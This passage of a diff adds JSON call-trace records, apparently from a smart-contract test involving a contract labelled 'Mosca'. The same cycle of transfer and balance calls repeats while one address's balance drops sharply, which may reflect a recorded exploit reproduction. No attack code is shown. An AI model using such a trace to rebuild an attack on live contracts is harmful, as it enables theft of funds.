+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "8113788374384236453205 [8.113e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "8113788374384236453205 [8.113e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "7148010049261083743846 [7.148e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "7148010049261083743846 [7.148e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "6182231724137931034487 [6.182e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "6182231724137931034487 [6.182e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "5216453399014778325128 [5.216e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "5216453399014778325128 [5.216e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "4250675073891625615769 [4.25e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "4250675073891625615769 [4.25e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "3284896748768472906410 [3.284e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "3284896748768472906410 [3.284e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "2319118423645320197051 [2.319e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "2319118423645320197051 [2.319e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1353340098522167487692 [1.353e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "1353340098522167487692 [1.353e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "102663",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "387561773399014778333 [3.875e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "387561773399014778333 [3.875e20]"
+    },
+    {
+        "id": "12871",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "408561773399014778333 [4.085e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "408561773399014778333 [4.085e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "429561773399014778333 [4.295e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "429561773399014778333 [4.295e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "450561773399014778333 [4.505e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "450561773399014778333 [4.505e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "471561773399014778333 [4.715e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "471561773399014778333 [4.715e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "492561773399014778333 [4.925e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "492561773399014778333 [4.925e20]"
+    },
+    {
+        "id": "3271",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91063",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "513561773399014778333 [5.135e20]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "513561773399014778333 [5.135e20]"
+    },
+    {
+        "id": "3271",
